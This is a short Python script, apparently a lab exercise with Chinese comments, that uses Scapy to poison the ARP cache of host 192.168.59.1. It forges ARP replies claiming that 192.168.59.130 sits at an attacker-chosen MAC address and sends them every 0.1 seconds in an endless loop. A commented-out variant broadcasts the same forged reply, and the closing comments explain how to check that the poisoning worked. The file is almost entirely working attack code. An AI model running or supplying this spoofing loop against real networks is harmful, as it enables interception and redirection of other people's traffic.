#!/bin/env python
#coding:utf8

from scapy.all import *
import time


"""
192.168.59.1    00:50:56:c0:00:08  
192.168.59.2    00:50:56:ee:a2:f7
192.168.59.128  00:0c:29:e7:00:8f  
192.168.59.129  00:0C:29:F7:CB:BF
"""


#广播           说 192.168.59.130 的mac是 00:0C:29:F7:CB:BF
#arp=ARP(op=2,psrc="192.168.59.130",pdst="192.168.59.255",hwsrc="00:0C:29:F7:CB:BF",hwdst="ff:ff:ff:ff:ff:ff")

#向192.168.59.1 说 192.168.59.130 的mac是 00:0C:29:F7:CB:BF
arp=ARP(op=2,psrc="192.168.59.130",pdst="192.168.59.1",hwsrc="00:0C:29:F7:CB:BF",hwdst="00:50:56:c0:00:08")



while 1:
    send(arp)
    #sendp(Ether()/arp)
    time.sleep(0.1)


"""
在192.168.59.1  ping 192.168.59.130
然后查看        arp -a
"""
